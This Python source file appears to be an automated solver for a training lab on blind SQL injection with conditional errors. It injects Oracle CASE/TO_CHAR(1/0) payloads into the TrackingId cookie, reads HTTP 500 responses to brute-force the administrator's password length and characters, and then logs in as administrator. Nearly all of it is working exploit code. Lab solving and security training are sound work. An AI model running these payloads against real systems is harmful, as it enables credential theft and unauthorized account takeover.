import string
from rich import print

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class BlindConditionalErrorsSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)

        url = f"{self.url}/login"
        self._request_lab('GET', url)
        self.session = self.html_content.cookies.get('session')
        self.trackingId = self.html_content.cookies.get('TrackingId')
        self.len_password = 0
        self.password = ""
        self.listChar = list(string.ascii_lowercase + string.digits)


    def solve(self):
        """Solve the lab."""
        self.custom_payload_finding_length_password()
        self.custom_payload()
        self.request_login(allow_redirects=False)
        self._print_solved()

    def custom_payload_finding_length_password(self):
        """Build the payload."""
        self.spinner.start()
        self.spinner.text = 'Brute Force Password Length'
        for idx in range(1, 100):
            cookies = {
                'session': self.session,
                'TrackingId': f"{self.trackingId}' AND (SELECT CASE WHEN LENGTH(password)>{idx} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
            }
            url = f"{self.url}"
            self._request_lab('GET', url, cookies=cookies)
            
            if self.html_content.status_code != 500:
                break
        
        self.spinner.stop()
        self.spinner.clear()
        print(f"[bold blue]Length Password:[/bold blue] {idx}")
        self.len_password = idx

    def custom_payload(self):
        """Build the payload."""
        self.spinner.start()
        self.spinner.text = 'Brute Force Password'
        for idx in range(self.len_password):
            for char in self.listChar:
                cookies = {
                    'session': self.session,
                    'TrackingId': f"{self.trackingId}' AND (SELECT CASE WHEN (SUBSTR(password,{idx+1},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
                }
                url = f"{self.url}"
                self._request_lab('GET', url, cookies=cookies)
                
                if self.html_content.status_code == 500:
                    self.spinner.stop()
                    self.spinner.clear()
                    self.password += char
                    self.spinner.text = f"Password: {self.password}"
                    self.spinner.start()
                    break
        
        self.spinner.stop()
        print(f"[bold blue]Password:[/bold blue] {self.password}")
        self.list_users = {"administrator": self.password}

    